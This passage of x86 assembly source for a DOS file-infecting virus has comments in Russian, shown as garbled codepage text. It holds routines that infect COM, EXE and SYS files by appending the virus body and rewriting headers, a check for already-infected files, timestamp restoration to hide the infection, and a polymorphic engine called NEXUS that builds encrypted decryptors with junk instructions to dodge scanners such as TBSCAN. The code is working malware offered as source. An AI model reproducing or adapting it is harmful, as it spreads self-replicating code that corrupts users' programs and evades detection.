           xor     ax,08320h
           xor     bx,0edb8h
      NoCRC:
           dec     dh
           jnz     NextBitCRC
           xor     ecx,eax
           xor     edx,ebx
           dec     di
           jnz     NextByteCRC
           not     edx
           not     ecx
           mov     eax,edx
           rol     eax,16
           mov     ax,cx
           pop     ds edi esi edx ecx ebx
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¨ä¨æ¨à®¢ ¨¥ handle
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    Infect_Handle:
           push    cs cs           ; ds ¨ es ¯®ª §ë¢ îâ    á
           pop     ds es
           call    ioctl           ; ¯à®¢¥àª  ä ©«    ä¨ªâ¨¢®áâì (disk file?)
           jc      close

           call    Inf_Check       ; ¯à®¢¥àª  ä ©«    ¯®¢â®à®¥ § à ¦¥¨¥
           jc      close

           mov     cx,32           ; çâ¥¨¥ § £®«®¢ª  ä ©« 
           lea     dx,original
           call    read
           cmp     cx,ax           ; DOS ¢¥àã« ¢á¥ § ¯à®è¥ë¥ ¤«ï
           jne     close           ; çâ¥¨ï ¡ ©âë?

           lea     si,original     ; á¤¥« âì ª®¯¨î ®à¨£¨ «ì®£®
           lea     di,header       ;  ç «  ¯à®£à ¬¬ë
           mov     cx,32
           cld
           rep     movsb

           lea     di,header
           cmp     host,"S"        ; ¯à®¢¥àª    .SYS â¨¯
           jz      sysinfect
           mov     ax,[di]         ; ¢§ïâì ¢ ax ¯¥à¢ë¥ 2 ¡ ©â  § £®«®¢ª 
           cmp     ax,'ZM'         ; ¯à®¢¥àª    EXE â¨¯
           je      exeinfect
           cmp     ax,'MZ'         ; â ª¨å EXEè¨ª®¢ ï ¨ª®£¤  ¥ ¢¨¤¥«
           je      exeinfect       ; ® £®¢®àïâ â ª¨¥ ¡ë¢ îâ
           jmp     cominfect

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¨ä¨æ¨à®¢ ¨¥ COM ä ©« 
   ; DI - § £®«®¢®ª, ª®â®àë© ã¦® ¬®¤¨ä¨æ¨à®¢ âì
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    cominfect:
           mov     host,"C"        ; COM file
           cmp     w [di],-1       ; ¤«ï ¯à¥¤®â¢à é¥¨ï ¡ £  á .SYS ä ©« ¬¨
           jz      Close           ; ªáâ â¨ íâ® ¥é¥ ¨ ¢ë§®¢¥â int 06h
           call    seek2eof        ; ¯®«ãç¥¨¥ à §¬¥à  ä ©« 
           or      dx,dx           ; à §¬¥à ä ©«  ¡®«ìè¥ 65535 ¡ ©â?
           jnz     Close
           cmp     ax,65035-vsize  ; ¯à®¢¥àª  ä ©«    ¯¥à¥¯®«¥¨¥
           ja      Close           ; ¬¥áâ® ¥é¥ ®áâ ¢«¥® ¯®¤ áâ¥ª ¨ PSP
           mov     b [di],0e9h     ; § ¯¨áì JMP
           mov     delta,ax        ; ¤®¯®«¨â¥«ì®¥ á¬¥é¥¨¥ ¤«ï ¯®«¨¬®àä 
           sub     ax,3            ; ª®àà¥ªæ¨ï (¬¨ãá à §¬¥à jump' )
           mov     w [di+1],ax     ; § ¯¨áì  ¤à¥á  ¯¥à¥å®¤ 
           jmp     check

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¨ä¨æ¨à®¢ ¨¥ SYS ä ©« 
   ; DI - § £®«®¢®ª, ª®â®àë© ã¦® ¬®¤¨ä¨æ¨à®¢ âì
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    sysinfect:
           mov     host,"S"        ; SYS file
           cmp     d [di],-1       ; ¤¥©áâ¢¨â¥«ì® ¤à ©¢¥à?
           jnz     Close

           call    seek2eof        ; ¯®«ãç¥¨¥ à §¬¥à  ä ©« 
           or      dx,dx           ; à §¬¥à ä ©«  ¡®«ìè¥ 65535 ¡ ©â?
           jnz     Close
           cmp     ax,65035-vsize  ; ¯à®¢¥àª  ä ©«    ¯¥à¥¯®«¥¨¥
           ja      Close

           mov     w [di+8],ax     ; ãáâ ®¢ª  á¬¥é¥¨ï ¯à®æ¥¤ãàë ¯à¥àë¢ ¨ï
           add     w [di+8],Interrupt-ksenia
           mov     w [di+6],ax     ; ãáâ ®¢ª  á¬¥é¥¨ï ¯à®æ¥¤ãàë áâà â¥£¨¨
           sub     ax,0100h
           mov     delta,ax        ; ¤®¯®«¨â¥«ì®¥ á¬¥é¥¨¥ ¤«ï ¯®«¨¬®àä 
           jmp     check

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¨ä¨æ¨à®¢ ¨¥ EXE ä ©« 
   ; DI - § £®«®¢®ª, ª®â®àë© ã¦® ¬®¤¨ä¨æ¨à®¢ âì
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    exeinfect:
           mov     host,"E"        ; EXE file
           cmp     b [di+18h],'@'  ; ¯à®¢¥àª  ä ©«    ¯à¨ ¤«¥¦®áâì
           je      close           ; ª ®¢®¬ã á¥¬¥©áâ¢ã WinNE ä ©«®¢

           mov     ax,W [di+4]     ; áç¨â âì ¯ à ¬¥âà PageCnt
           mov     cx,W [di+2]     ; áç¨â âì ¯ à ¬¥âà PartPag
           or      cx,cx           ; ¥á«¨ ¤«¨  ¯®á«¥¤¥© áâà ¨æë à ¢ 
           jz      $+3             ; ã«î, â® ¯ à ¬¥âà PageCnt ¥ á®¤¥à¦¨â
           dec     ax              ; ¤®¯®«¨â¥«ì®© ¥¤¨¨æë
           mov     dx,512          ; ã¬®¦¥¨¥   512 (¯®«ãç¥¨¥ ¡ ©â)
           mul     dx
           add     ax,cx           ; ¯®«ãç¥¨¥ ¤«¨ë ¨§ EXE ä ©« , ª®â®à ï
           adc     dx,0            ; £àã§¨âáï ¢ ¯ ¬ïâì ¯à¨ § ¯ãáª¥ íâ® EXE

           push    dx ax           ; á®åà ¨âì ¯ à¥¬¥âà ¢ áâ¥ª¥
           call    seek2eof        ; ¯®«ãç¥¨¥ ¤¨áª®¢®£® à §¬¥à  ä ©« 
           pop     si cx           ; § £àã§ª  ¯ à ¬¥âà®¢ ¨§ áâ¥ª 
           cmp     si,ax           ; áà ¢¥¨¥ ¯ à ¬¥âà®¢ (¢ëï¢«¥¨¥
           jnz     Close           ; ¢áïª¨å overlay áâàãªâãà)
           cmp     cx,dx
           jnz     Close           ; ®ç¥ì ¡®«ìè¨¥ ä ©«ë  ¬ ¥ ¯®¤å®¤ïâ
           cmp     dx,10           ; ª ª ®¨ ¢ ¯ ¬ïâì £àã§ïâìáï??? ® â ª¨¥
           jae     Close           ; ¡ë¢ îâ (á«ãç ¥âáï divide overflow ¨¦¥)

           push    ax dx           ; á®åà ¥¨¥ ¯ à ¬¥âà®¢
           mov     cx,16           ; ¯®«ãç¥¨¥ ¢å®¤®© â®çª¨ (CS:IP), ª®â®àë¥
           div     cx              ; à á¯®«®¦¥ë ¢ ª®æ¥ ç¨áâ®£® EXE ä ©« 
           sub     ax,[di+8]       ; ¢ëç¨â ¨¥ à §¬¥à  EXE § £®«®¢ª 
           mov     delta,dx        ; ¤®¯®«¨â¥«ì®¥ á¬¥é¥¨¥ ¤«ï ¯®«¨¬®àä 
           sub     ax,10h          ; ¯®¤®¡¨¥ COM ä ©«ã (IP ¡®«ìè¥/à ¢® 100h)
           add     dx,100h
           mov     W [di+14h],dx   ; á®åà ¥¨¥ IP
           mov     W [di+16h],ax   ; á®åà ¥¨¥ CS
           mov     W [di+0eh],ax   ; á®åà ¥¨¥ SS (®© TBSCAN § ®à¥â)
           mov     W [di+10h],-2   ; á®åà ¥¨¥ SP
           pop     dx ax           ; § £àã§ª  ¯ à ¬¥âà®¢ ¨§ áâ¥ª 

           add     ax,vsize        ; ¤®¡ ¢«¥¨¥ ª à §¬¥àã ä ©« 
           adc     dx,0            ; ¤«¨ë ¢¨àãá 
           mov     cx,512          ; áç¨â ¥¬ ®¢ë¥ PartPag ¨ PageCnt ¤«ï
           div     cx              ; ä ©«  ¢¬¥áâ¥ á ¢¨àãá®¬
           or      dx,dx
           jz      $+3
           inc     ax
           mov     [di+2],dx       ; á®åà ¥¨¥ PartPag
           mov     [di+4],ax       ; á®åà ¥¨¥ PageCnt

    Check: call    WriteVirus      ; § ¯¨áì ¢¨àãá ¢ ä ©«

    Close: call    CorrectDate     ; ¯à ¢ª  ¤ âë ¨ä¨æ¨à®¢ ®£® ä ©« 
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; § ¯¨áì § è¨äà®¢ ®£® â¥«  ¢¨àãá  ¢ ä ©«
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    WriteVirus:
           call    GetDate         ; § ¯à®á ¢à¥¬¥¨/¤ âë ä ©« 

           cmp     cs:save_ax,1857h; ¯à®¢¥àª  ¥®¡å®¤¨¬®áâ¨ ¯®à¢¥àª¨
           jz      no_time         ; ¢à¥¬¥¨ ä ©« 

           mov     ah,2ch          ; § ¯à®á â¥ªãé¥£® ¢à¥¬¥¨
           call    int21           ; ¢ dx:cx
           mov     ax,cs:time      ; ¢ ax ¢à¥¬ï ä ©« 
           shr     ah,3            ; ¡¥à¥¬ ç áë (¡¨âë 11-15 ¢ cx)
           cmp     ah,ch           ; á®¢¯ ¤ îâ? ¥á«¨ ¤ , â® áêï¡ë¢ ¥¬áï,
           je      write_fail      ; çâ®¡ë ¥ § á¢¥â¨âìáï
    no_time:
           call    seek2eof        ; -> ª®¥æ
           call    nexus
           call    write           ; § ¯¨áë¢ ¥¬áï ¢ ä ©«
           xor     cx,ax           ; ¢á¥ § ¯¨á «®áì?
           jnz     write_fail

           call    seek2bof        ; ¨¤¥¬ ¢  ç «®
           mov     cx,32           ; § £®«®¢®ª com/exe ä ©« 
           lea     dx,header
           mov     w header+12h,v_id
           call    write

     write_fail:
           call    RestDate        ; ¢®ááâ ®¢«¥¨¥ ¤ âë ä ©« 
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯à®¢¥àª  ä ©«    ¨ä¨æ¨à®¢ ®áâì
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    Inf_Check:
          call    SaveRegs         ; á®åà ¨âì ¢ áâ¥ª¥ à¥£¨áâàë

          call    SeekSave         ; á®åà ï¥¬ ¯®§¨æ¨î lseek
          call    seek2bof         ; ¯¥à¥®á¨¬ ãª § â¥«ì    ç «®

          mov     cx,32            ; ç¨â ¥¬ § £®«®¢®ª ¢ ¡ãä¥à
          lea     dx,buffer
          push    cs cs
          pop     ds es
          call    read

          call    RestoreSeek      ; ¢®ááâ ®¢¨âì ¯®§¨æ¨î lseek
          xor     cx,ax            ; ¢á¥ ¯à®ç¨â «®áì?
          jnz     not_infected
          cmp     w buffer+12h,v_id
          jnz     not_infected

          call    LoadRegs
          stc
          ret

    not_infected:
          call    LoadRegs
          clc
          ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; CRLOAD - ¯®¤¯à®£à ¬¬  ¤«ï ¯®«ãç¥¨ï ®à¨£¨ «ì®£®  ç « 
   ; § à ¦¥®© ¯à®£à ¬¬ë ¨§ § è¨äà®¢ ®£® ¢¨àãá  ¢ íâ®© ¯à®£à ¬¬¥
   ; ¢å®¤: BX - handle ¨ä¨æ¨à®¢ ®© ¯à®£à ¬¬ë
   ; ¢ëå®¤: "buffer" á®¤¥à¦¨â 32 ®à¨£¨ «ìëå ¡ ©â 
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    crload:
           call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢
           push    cs cs           ; ¨¨æ¨ «¨§ æ¨ï á¥£¬¥âëå à¥£¨áâà®¢
           pop     ds es

           xor     cx,cx           ; á®åà ¥¨¥ ¯®§¨æ¨¨ ãª § â¥«ï ¢ ä ©«¥
           xor     dx,dx
           call    seekfrom_cur
           push    dx ax

           mov     cx,-1           ; ¨¤¥¬ ¢ ª®¥æ ¢¨àãá 
           mov     dx,-32          ;
           call    seekfrom_eof    ;

           mov     cx,32           ; ç¨â ¥¬ § £®«®¢®ª
           lea     dx,buffer       ; ¢ ¡ãä¥à
           call    read

           pop     dx cx           ; ¢®ááâ  ¢«¨¢ ¥¬ ¯®§¨æ¨î ãª § â¥«ï
           call    seekfrom_bof

           call    LoadRegs        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           ret

   °±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±
   ; POLYMORPHIC ENGINE [NEXUS]
   ; ¢ ª ç¥áâ¢¥ ¢å®¤ëå ¯ à ¬¥âà®¢ ãáâ ®¢¨âì DELTA ª ª íªáâà  á¬¥é¥¨¥ ¢ ä ©«¥
   ;   ¢ëå®¤¥ CX,DX £®â®¢ë ª ¢ë§®¢ã äãªæ¨¨ 40h ¯à¥àë¢ ¨ï int 21h
   °±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±°±
    crlen  equ     234h            ; à §¬¥à ¯®«¨¬®àä®£® à áè¨äà®¢é¨ª 
    cripts equ     10              ; ª®«¨ç¥áâ¢® ¨áâàãªæ¨© ¤«ï à áè¨äà®¢ª¨
    totlen equ     7+3+3+3+4*cripts+3+2  +1+4+7
    totblk equ     7+1+1+1+cripts  +1+1+1  +1+7 -1
    totfre equ     crlen-totlen
    aftpus equ     7*2
    public nexus
    if     totfre lt 0
    %out   ‡€*…‡…*‚ˆ*Ž‚€**ŽƒŽ *“”…*€ *…„Ž‘’€’Ž—*Ž - €‘‘…Œ*‹ˆ*Ž‚€*ˆ… **…*‚€*Ž
    tasm   sucks
    endif

    nexus: call    SaveRegs        ; á®åà ¥¨¥ à¥£¨áâà®¢

           cld                     ; clear direction
           push    cs cs           ; ¨¨æ¨ «¨§ æ¨ï á¥£¬¥âëå
           pop     ds es           ; à¥£¨áâà®¢

           lea     di,buffer+crlen ; á¬¥é¥¨¥ á¢®¡®¤®£® ¯à®áâà áâ¢ 
           mov     cx,totblk       ; ª®«¨ç¥áâ¢® ªãáª®¢ ¬ãá®à 
           xor     bx,bx           ; áã¬¬  á«ãç ©ëå ç¨á¥«

           push    cx di           ; § ¯®«¥¨¥ ¡ãä¥à 
    prnd:  mov     ax,100h         ; á«ãç ©ë¬¨ á«®¢ ¬¨
           call    xrandom
           stosw
           add     bx,ax
           loop    prnd
           pop     si cx
           xor     bp,bp

    srnd:  mov     ax,[si]         ; ¬®¤¨ä¨æ¨à®¢ ¨¥ á«ãç ©ëå
           mov     di,totfre       ; ç¨á¥« â ª¨¬ ®¡à §®¬, çâ®¡
           mul     di              ; ¨å áã¬¬  ¡ë«  à ¢  ª®«¨ç¥áâ¢ã
           div     bx              ; ®â¢¥¤¥ëå «¤ï ¬ãá®à  ¡ ©â § 
           mov     [si],ax         ; ¨áª«îç¥¨¥¬ ®áâ âª  ®â ¤¥«¥¨ï,
           add     bp,ax           ; ª®â®àë© ¯®©¤¥â ¢ ¡«®ª ¬ãá®à ,
           add     si,2            ;  å®¤ïé¨©áï ¯®á«¥ ¯à®æ¥¤ãàë
           loop    srnd            ; á®åà ¥¨ï ¢á¥å à¥£¨áâà®¢

           lea     si,buffer+crlen ; ¡ãä¥à á«ãç ©ëå ç¨á¥«
           mov     ax,totfre       ; ª®«¨ç¥áâ¢® ¡ ©â, ¯®«ãç¨¢è¨åáï
           sub     ax,bp           ; ¢ à¥§ã«ìâ â¥ ¯®«ãç¥¨ï ®áâ âª 
           add     [si+aftpus],ax  ; ¤®¡ ¢«¥¨¥ ¡ ©â

           mov     r_used,0ffh     ; ¢á¥ à¥£¨áâàë § ïâë
           lea     si,pushs        ; ¯®àï¤®ª á®åà ¥¨¥/¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           lea     di,buffer       ; ãª § â¥«ì   ¬¥áâ® ¤«ï ¤¥áªà¨¯â®à 
           mov     r_ptr,o buffer+crlen
           mov     cx,07           ; ¢á¥£® ã¦® á®åà ¨âì 7 à¥£¨áâà®¢

    pushr: not     r_used
           mov     w_flag,1        ; áâ¥ª à ¡®â ¥â á® á«®¢ë¬¨ à¥£¨áâà ¬¨
           call    xreg            ; ¯®«ãç¥¨¥ á«ãç ©®£® ®¬¥à  à¥£¨áâà 
           not     r_used
           not     ah              ; ¨¢¥àâ¨à®¢ ¨¥ AH
           and     r_used,ah       ; ¯®¬¥âª  ¡¨â  ª ª ã¦¥ á®åà ¥®£®
           or      al,01010000b    ; ®¯ª®¤ PUSH <R16>
           stosb                   ; á®åà ¥¨¥ ª®¬ ¤ë
           mov     [si],al         ; á®åà ¥¨¥ ®ç¥à¥¤®áâ¨
           inc     si              ; ¨ªà¥¬¥â¨à®¢ ¨¥ ãª § â¥«ï
           call    garbage         ; £¥¥à æ¨ï ¬ãá®àëå ª®¬ ¤
           loop    pushr

           mov     w_flag,1        ; ã¦¥ 16-¡¨âë© à¥£¨áâà
           call    xreg            ; ˆ¨æ¨ «¨§ æ¨ï ‘ç¥âç¨ª 
           call    tomask          ; ¯®«ãç¥¨¥ ®¬¥à  à¥£¨áâà 
           mov     countr,al
           or      r_used,dl       ; § ¥á¥¨¥ ¥£® ¢ á¯¨á®ª ¨á¯®«ì§®¢ ëå
           or      al,10111000b    ; á®§¤ ¨¥ ª®¬ ¤ë MOV REG,Const (16)
           stosb                   ; á®åà ¥¨¥ ª®¬ ¤ë
           mov     ax,(vsize-crlen-32)/2 ; ¢ëç¨á«¥¨¥ ª®«¨ç¥áâ¢  ¡ ©â ¤«ï § è¨äà®¢ª¨
           stosw                   ; á®åà ¥¨¥ ª®áâ âë
           call    garbage         ; £¥¥à æ¨ï ¬ãá®àëå ª®¬ ¤

    gidx:  mov     w_flag,1        ; £¥¥à æ¨ï 16-¡¨â®£®  ¤à¥á®£® à¥£¨áâà 
           call    xreg            ; £¥¥à æ¨ï á«ãç ©®£® à¥£¨áâà 
           mov     ah,111b         ; ¯à®¢¥àª     ¤à¥áë© à¥£¨áâà ¨ ¯®«ãç¥¨ï
           cmp     al,011b         ; ¯ à ¬¥âà  ¤«ï  ¤à¥á æ¨¨ á ¯®¬®éìî íâ®£®
           je      sidx            ; à¥£¨áâà 
           mov     ah,100b
           cmp     al,110b
           je      sidx
           mov     ah,101b
           cmp     al,111b
           jne     gidx

    sidx:  call    tomask
           or      r_used,dl       ; á®åà ¥¨¥ ®¬¥à   ¤à¥á®£® à¥£¨áâà 
           mov     indexr,al
           mov     indexm,ah       ; á®åà ¥¨¥ ¯ à ¬¥âà  R/M

           or      al,10111000b    ; ˆ¨æ¨ «¨§ æ¨ï €¤à¥á®£® *¥£¨áâà 
           stosb                   ; á®§¤ ¨¥ ª®¬ ¤ë MOV REG,Const (16)
           mov     ax,delta        ; ¢ëç¨á«¥¨¥ á¬¥é¥¨ï  ç «  § è¨äà®¢ ®£®
           add     ax,crlen+100h   ; ¢¨àãá  ¢ ä ©«¥
           stosw
           call    garbage         ; £¥¥à æ¨ï ¬ãá®àëå ª®¬ ¤

           mov     bp,di
           mov     w_flag,1        ; £¥¥à æ¨ï 16-¡¨â®£® à¥£¨áâà - ªªã¬ã«ïâ®à 
           call    xreg            ; £¥¥à æ¨ï á«ãç ©®£® à¥£¨áâà 
           call    tomask
           or      r_used,dl       ; á®åà ¥¨¥ ®¬¥à   ¤à¥á®£® à¥£¨áâà 
           mov     accumr,al
           mov     ax,8b2eh        ; CS: MOV
           stosw
           mov     al,accumr
           shl     al,3
           or      al,indexm
           stosb
           call    garbage         ; £¥¥à æ¨ï ¬ãá®àëå ª®¬ ¤

           mov     cx,cripts       ; ª®«¨ç¥áâ¢® ¨áâàãªæ¨© § ªà¨¯â®¢ª¨
           lea     bx,nbuf+cripts*4
           mov     b [bx],0c3h

    rchos: sub     bx,4
           mov     ax,oplen        ; ¢ë¡®à á«ãç ©®£® è¨äà®¢é¨ª 
           call    xrandom
           mov     si,ax           ; SI=AX*2
           add     si,ax
           mov     ax,w [si+enopI]
           mov     w [bx],ax
           mov     ax,w [si+deopI]
           mov     w [di],ax
           mov     al,accumr
           or      [di+1],al
           xor     ax,ax
           call    xrandom
           mov     [bx+2],ax
           mov     [di+2],ax
           add     di,4
           call    garbage         ; £¥¥à æ¨ï ¬ãá®àëå ª®¬ ¤
           loop    rchos

           mov     ax,892eh        ; CS: MOV
           stosw
           mov     al,accumr
           shl     al,3
           or      al,indexm
           stosb
           call    garbage         ; £¥¥à æ¨ï ¬ãá®àëå ª®¬ ¤

           mov     al,01000000b    ; ƒ¥¥à æ¨ï ã¢¥«¨ç¥¨ï ¨¤¥ªá®£® à¥£¨áâà 
           or      al,indexr
           stosb
           call    garbage         ; £¥¥à æ¨ï ¬ãá®àëå ª®¬ ¤
           stosb
           call    garbage         ; £¥¥à æ¨ï ¬ãá®àëå ª®¬ ¤

           mov     al,01001000b    ; “¬¥ìè ¥¬ áç¥âç¨ª
           or      al,countr
           stosb
           mov     ax,850fh
           stosw
           mov     ax,bp
           sub     ax,di
           sub     ax,2
           stosw

           mov     r_used,0        ; ¨ ®¤¨ ¨§ à¥£¨áâà®¢ ¡®«ìè¥ ¥ ã¦¥
           mov     cx,07           ; ¢á¥£® ã¦® ¢®ááâ ®¢¨âì 7 à¥£¨áâà®¢
           lea     si,pushs+07-1   ; ¯®àï¤®ª á®åà ¥¨¥/¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
    movr:  call    garbage         ; £¥¥à æ¨ï ¬ãá®àëå ª®¬ ¤
           mov     al,[si]         ; § ¯®«¥¨¥ ¯®«¥© ¤«ï
           dec     si              ; ¢®ááâ ®¢«¥¨ï à¥£¨áâà®¢
           call    tomask
           or      r_used,dl
           or      al,1000b        ; ¨§ áâ¥ª  ¢ ¤¥ªà¨¯â®à¥
           stosb
           and     al,111b
           loop    movr

           mov     cx,shield-ksenia-crlen
           lea     si,ksenia+crlen
           lea     di,buffer+crlen
           rep     movsb
           mov     cx,endi-shield-1
    dupcr: lodsb
           sub     al,[si]
           stosb
           loop    dupcr
           mov     cx,eov-endi+1
           rep     movsb

           mov     cx,(vsize-crlen-32)/2
           lea     di,buffer+crlen
    encp:  mov     ax,[di]
           call    near ptr nbuf
           stosw
           loop    encp

           call    LoadRegs
           mov     cx,vsize
           lea     dx,buffer
           ret

    tomask:
           push    cx
           mov     cl,al
           mov     dx,1
           shl     dl,cl
           pop     cx
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯®¤¯à®£à ¬¬  ¤«ï £¥¥à æ¨¨ ¬ãá®à®£® ª®¤  á«ãç ©®£® à §¬¥à 
   ; DS=ES=CS, [DI] - ¡ãä¥à ¤«ï ¬ãá®à  (DI ¨ªà¥¬¥â¨àã¥âáï)
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    garbage:
           push    ax cx si
           mov     si,r_ptr
           lodsw
           mov     r_ptr,si
           xchg    ax,cx
           jcxz    gret

    ggen:  push    di cx
           lea     di,crbuf
           call    gcmd
           xchg    ax,cx
           pop     cx di
           cmp     cx,ax
           jc      ggen
           lea     si,crbuf

    gdup:  movsb
           dec     cx
           dec     ax
           jnz     gdup
           or      cx,cx
           jnz     ggen

    gret:  pop     si cx ax        ; ¢®ááâ ®¢«¥¨¥ à¥£¨áâà®¢
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯®¤¯à®£à ¬¬  ¤«ï £¥¥à æ¨¨ á«ãç ©®© ¬ãá®à®© ¨áâàãªæ¨¨
   ; DS=ES=CS, [DI] - ¡ãä¥à ¤«ï ¨áâàãªæ¨¨
   ;   ¢ëå®¤¥ CX - ¤«¨  ¨áâàãªæ¨¨ ¢ ¡ ©â å
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    gcmd:  push    ax bx dx si di  ; á®åà ¥¨¥ à¥£¨áâà®¢

    regen: lea     si,opcode       ; â ¡«¨æ  á ®¯ª®¤ ¬¨
           mov     ax,oclen        ; £¥¥à æ¨ï á«ãç ©®£® ç¨á«  ¢ ¯à¥¤¥«¥ ®â
           call    xrandom         ; ã«ï ¤® ª®«¨ç¥áâ¢  áâà®ª ¢ â ¡«¨æ¥
           add     si,ax           ; ¯®«ãç¥¨¥ á¬¥é¥¨ï ª ¢ë¡à ®© ïç¥©ª¥
           add     si,ax
           add     si,ax
           mov     dl,[si]         ; § £àã§ª  “¯à ¢«ïîé¥£®_¡ ©â 
           mov     ax,[si+1]       ; ª®¯¨à®¢ ¨¥ è ¡«®  ¨áâàãªæ¨¨
           mov     [di],ax

           bt      dx,5
           jnc     not_a_mem
           mov     ax,[di]
           mov     [di+1],ax
           mov     b [di],2eh
           mov     bx,2
           mov     w_flag,0
           call    xreg
           jc      regen
           shl     al,3
           or      [di+bx],al
    badr:  mov     ax,1000b
           call    xrandom
           cmp     al,110b
           jz      badr
           or      [di+bx],al
           jmp     nINS

    not_a_mem:
           xor     bx,bx
           bt      dx,0            ; ãáâ ®¢ª  ¤«¨ë ¨áâàãªæ¨¨
           setc    bl

           bt      dx,6
           setc    w_flag
           test    dl,00000100b    ; ¯à®¢¥àª  ¥®¡å®¤¨¬®áâ¨ £¥¥à æ¨¨
           jz      nWRD            ; ¯®«ï WRD
           mov     ax,2
           call    xrandom
           mov     w_flag,al
           or      [di],al         ; ãáâ ®¢ª  ¯®«ï ¢ ïç¥©ª¥ ¯ ¬ïâ¨
    nWRD:  test    dl,10000000b
           jz      nADDi
           mov     ax,1000b
           call    xrandom
           shl     al,3
           or      [di+bx],al
    nADDi: test    dl,00000010b    ; ¯à®¢¥àª  ¥®¡å®¤¨¬®áâ¨ £¥¥à æ¨¨
           jz      nREG            ; ¯®«ï REG
           call    xreg            ; £¥¥à æ¨ï á«ãç ©®£® à¥£¨áâà 
           jc      regen
           or      [di+bx],al      ; ãáâ ®¢ª  ¯®«ï ¢ ïç¥©ª¥ ¯ ¬ïâ¨
    nREG:  mov     cl,dl
           shr     cl,3
           and     cl,11b          ; ¯à®¢¥àª  ¥®¡å®¤¨¬®áâ¨ £¥¥à æ¨¨
           jz      nRND            ; á«ãç ©®£® § ç¥¨ï ¯®á«¥ ¨áâàãªæ¨¨
           cmp     cl,11b
           jne     putrnd
           mov     cl,w_flag
           inc     cl

     putrnd:
           xor     ax,ax
           call    xrandom
           mov     [di+bx+1],al
           inc     bx
           dec     cl
           jnz     putrnd
    nRND:

    nINS:  mov     cx,bx
           inc     cx
           pop     di si dx bx ax  ; § £àã§ª  à¥£¨áâà®¢
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯®¤¯à®£à ¬¬  ¤«ï £¥¥à æ¨¨ á«ãç ©®£® ª®¤  à¥£¨áâà  ¢ AL ¨ ¥£® ®¬¥à  ¢ AH
   ;   ¢å®¤¥: r_used - ®¬¥à  § ïâëå 16-¡¨âëå à¥£¨áâà®¢
   ;           w_flag - à §àï¤®áâì à¥£¨áâà  (0-8 ¡¨â,1-16 ¡¨â)
   ;   ¢ëå®¤¥: CF=0 - à¥£¨áâà  ©¤¥ ¨ ® ¢ AL
   ;            CF=1 - à¥£¨áâà ¥  ©¤¥, AX à §àãè¥
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    xreg:  mov     al,11101111b    ; ¬ áª  ¤«ï ¯à®¢¥àª¨ 16-¡¨â®£® à¥£¨áâà /SP
           cmp     w_flag,1        ; ¯à®¢¥àª  à¥¦¨¬  £¥¥à æ¨¨
           jz      cbt
           mov     al,1111b        ; ¯à®¢¥àª  4 ¡¨â®¢ ¤«ï 8-¡¨â®£® ç¨á« 
    cbt:   mov     ah,r_used       ; § £àã§ª  ¡¨âëå ®¬¥à®¢
